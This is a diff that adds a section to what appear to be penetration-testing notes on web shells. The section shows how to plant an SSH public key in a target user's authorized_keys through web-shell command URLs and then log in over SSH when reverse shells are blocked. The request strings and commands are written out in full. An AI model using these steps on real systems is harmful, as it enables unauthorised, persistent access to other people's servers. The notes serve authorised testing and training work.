@@ -313,9 +313,31 @@ sudo nmap -v 192.168.86.39 --script banner.nse
 
 * Web apps may auto-delete uploaded files after a set period
 * Limited interactivity — no proper file system navigation, chaining commands may fail
+* If outbound callbacks are blocked and the webshell runs as a user with SSH access, write your public key to that user's `authorized_keys` and connect inbound over SSH instead of forcing a reverse shell.
 * Greater chance of leaving artifacts for defenders
 * Best practice: establish a reverse shell from the web shell, then delete the uploaded payload
 * Document all payload names, file hashes (SHA1/MD5), and upload locations for your report
+
+### Web Shell to SSH When Reverse Shells Fail
+
+Base64 the public key first so special characters survive URL encoding and shell parsing:
+
+```bash
+echo 'ssh-ed25519 AAAA... attacker@kali' | base64 -w 0
+```
+
+From the webshell, create `.ssh` and append the decoded key:
+
+```text
+http://TARGET/shell.php?cmd=mkdir%20-p%20/home/USER/.ssh
+http://TARGET/shell.php?cmd=printf%20%22BASE64_KEY%22%20|%20base64%20-d%20%3E%3E%20/home/USER/.ssh/authorized_keys
+```
+
+Then connect over SSH:
+
+```bash
+ssh USER@TARGET -i ~/.ssh/id_ed25519
+```
 
 ---
 
